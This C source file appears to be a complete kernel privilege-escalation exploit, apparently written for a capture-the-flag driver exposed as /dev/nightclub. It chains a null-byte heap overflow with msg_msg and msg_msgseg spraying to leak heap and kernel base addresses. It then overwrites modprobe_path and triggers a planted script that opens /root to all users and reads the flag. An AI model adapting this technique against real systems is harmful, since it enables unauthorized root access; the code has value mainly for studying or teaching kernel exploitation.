#include "./exploit.h"
#include <sys/ipc.h>
#include <sys/mman.h>

/*********** commands ******************/
#define DEV_PATH "/dev/nightclub"   // the path the device is placed

#define NIGHT_ADD   0xcafeb001
#define NIGHT_DEL   0xcafeb002
#define NIGHT_EDIT  0xcafeb003
#define NIGHT_INFO  0xcafeb004

//#define DATALEN_MSG	((size_t)PAGESIZE-sizeof(struct msg_msg))
#define DATALEN_MSG	((size_t)PAGE-0x30)
#define DATALEN_SEG	((size_t)PAGE-0x8)

struct night{
  struct night *next; // double-linked list, where new node is inserted into head->next.
  struct night *prev;
  char unset1[0x16];
  ulong offset;
  char unset2[0x16];
  uint randval;
  char unset[0x14];
  char unknown2[0x10];
  char data[0x20];
} night;

struct userreq{
  char unknown2[0x10];
  char data[0x20];
  uint target_randval;
  uint uunknown1;
  ulong offset;
  uint size;
};

/*********** globals ******************/

int night_fd = -1;
const ulong diff_master_list_edit = 0xffffffffc0002100 - 0xffffffffc0000010;
const ulong diff_modprobe_path = 0xffffffff8244fca0 - 0xffffffff81000000;

// (END globals)

long night_ioctl(ulong cmd, void *req) {
  if (night_fd == -1) errExit("night_fd is not initialized.");
  long ret = ioctl(night_fd, cmd, req);
  assert(ret != -1);
  return ret;
}

uint night_info(void) {
  long diff = night_ioctl(NIGHT_INFO, NULL);
  return diff;
}

uint night_add(char *buf, ulong offset, uint size) {
  struct userreq req = {
    .offset = offset,
    .size = size,
  };
  memcpy(req.data, buf, 0x20);
  long ret = night_ioctl(NIGHT_ADD, &req);
  assert(ret != -1);
  return ret;
}

void night_edit(char *buf, uint target_randval, ulong offset, uint size) {
  struct userreq req = {
    .offset = offset,
    .size = size,
    .target_randval = target_randval,
  };
  memcpy(req.data, buf, 0x20);
  assert(night_ioctl(NIGHT_EDIT, &req) == 0);
}

void night_del(uint target_randval) {
  struct userreq req = {
    .target_randval = target_randval,
  };
  assert(night_ioctl(NIGHT_DEL, &req) == 0);
}

struct msgbuf80 {
  long mtype;
  char mtext[0x80];
};
struct msgbuf80alpha {
  long mtype;
  char mtext[(DATALEN_MSG + 0x30) + 0x80 - 8]; // -8 is for msg_msgseg of second segment
};

int main(int argc, char *argv[]) {
  puts("[ ] Hello, world.");
  assert((night_fd = open(DEV_PATH, O_RDWR)) > 2);
  char *buf = mmap(NULL, PAGE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  assert(buf != MAP_FAILED);
  memset(buf, 'A', PAGE);

  // prepare for modprobe_path tech
  system("echo -n '\xff\xff\xff\xff' > /home/user/evil");
  system("echo '#!/bin/sh\nchmod -R 777 /root\ncat /root/flag' > /home/user/nirugiri");
  system("chmod +x /home/user/nirugiri");
  system("chmod +x /home/user/evil");

  // clean kmalloc-128
  puts("[.] cleaning heap...");
  #define CLEAN_N 40
  struct msgbuf80 clean_msg80 = { .mtype = 1 };
  struct msgbuf80alpha clean_msg80alpha = { .mtype = 1 };
  memset(clean_msg80.mtext, 'X', 0x80);
  memset(clean_msg80alpha.mtext, 'X', sizeof(clean_msg80alpha.mtext));
  for (int ix = 0; ix != CLEAN_N; ++ix) {
    int qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
    KMALLOC(qid, clean_msg80, 1);
  }

  // get diff of __kernel and edit_chunk and __kmalloc
  uint edit_kmalloc_diff = night_info();
  printf("[+] edit_chunk - __kmalloc: 0x%x\n", edit_kmalloc_diff);

  // add first chunks
  #define FIRST_N 10
  uint randvals[FIRST_N] = {0};
  printf("[.] allocating first chunks (%d)\n", FIRST_N);
  for (int ix = 0; ix != FIRST_N; ++ix) {
    randvals[ix] = night_add(buf, 0, 0x1F);
    printf("[.] alloced randval: %x\n", randvals[ix]);
  }

  // single NULL-byte overflow into night[6]->next
  night_edit(buf, randvals[5], 0, 0x20);

  night_del(randvals[4]);
  // allocate msg_msgseg + userdata at &night[4]
  int qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
  KMALLOC(qid, clean_msg80alpha, 1);
  // make night[2]->prev point to &night[4]
  night_del(randvals[6]);
  // leak heap addr via msg_msgseg
  ssize_t n_rcv = msgrcv(qid, &clean_msg80alpha, sizeof(clean_msg80alpha.mtext) - 0x30, clean_msg80alpha.mtype, 0);
  printf("[+] received 0x%x size of message.\n", n_rcv);
  ulong leaked_heap = *(ulong*)(clean_msg80alpha.mtext + DATALEN_MSG);
  ulong heap_base = leaked_heap - 0x380;
  printf("[!] leaked heap: 0x%lx\n", leaked_heap);
  printf("[!] heapbase: 0x%lx\n", heap_base);


  /** overwrite next pointer, edit msg_msg's size, read heap sequentially, leak master_list. **/

  // heap is tampered, allocate fresh nights.
  #define SECOND_N 6
  uint randvals2[SECOND_N] = {0};
  for (int ix = 0; ix != SECOND_N; ++ix) {
    randvals2[ix] = night_add(buf, 0, 0x20);
  }

  // allocate simple msg_msg + userdata
  memset(clean_msg80.mtext, 'Y', 0x50);
  KMALLOC(qid, clean_msg80, 1);

  // overflow to overwrite night[1]->next to allocated msg_msg
  printf("[+] overwrite next target with 0x%lx\n", heap_base+ 0x700 + 0x10 - 0x60);
  *(ulong*)(buf + 0x10) = heap_base + 0x700 + 0x10 - 0x60;
  night_edit(buf, randvals2[3], 0x10, 0x20);

  // edit to overwrite msg_msg.m_ts with huge value
  ulong val[0x2];
  val[0] = 1;
  val[1] = 0x200; // m_ts
  night_edit((char*)val, 0x41414141, 0, 0x10);

  // allocate new night and read master_list
  night_add(buf, 0, 0);
  n_rcv = msgrcv(qid, &clean_msg80, 0x500, clean_msg80alpha.mtype, 0);
  printf("[+] received 0x%x size of message.\n", n_rcv);
  ulong master_list = *(ulong*)(clean_msg80.mtext + 0xb * 8);
  ulong edit_chunk = master_list - diff_master_list_edit;
  ulong __kmalloc = edit_chunk - edit_kmalloc_diff;
  ulong kbase = __kmalloc - 0x1caa50;
  ulong modprobe_path = kbase + diff_modprobe_path;
  printf("[!] master_list: 0x%lx\n", master_list);
  printf("[!] edit_chunk: 0x%lx\n", edit_chunk);
  printf("[!] __kmalloc: 0x%lx\n", __kmalloc);
  printf("[!] kbase: 0x%lx\n", kbase);
  printf("[!] modprobe_path: 0x%lx\n", modprobe_path);

  /** overwrite modprobe_path **/
  strcpy(clean_msg80.mtext, "/home/user/nirugiri\x00");

  // heap is collapsed, allocate fresh nights.
  #define THIRD_N 2
  uint randvals3[THIRD_N] = {0};
  for (int ix = 0; ix != THIRD_N; ++ix) {
    randvals3[ix] = night_add(buf, 0, 0x20);
  }

  // overwrite night's next ptr
  printf("[+] overwrite next target with 0x%lx\n", heap_base + 0x8c0 - 0x60);
  *(ulong*)(buf + 0x10) = heap_base + 0x8c0 - 0x60; // heap's next ptr is placed at +0x40 of chunk.
  night_edit(buf, randvals3[0], 0x10, 0x20);

  // edit to overwrite heap's next pointer
  val[0] = modprobe_path - 0xa0 + 0x80 - 0x10;
  val[1] = 0x0;
  night_edit((char*)val, 0x0, 0, 0x10);

  // overwrite modprobe_path
  night_add(buf, 0, 0);
  puts("[+] allocating msg_msg on modprobe_path.");
  qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
  KMALLOC(qid, clean_msg80, 1);

  // invoke evil script
  puts("[!] invoking evil script...");
  system("/home/user/evil");

  // end of life
  puts("[ ] END of life...");
}
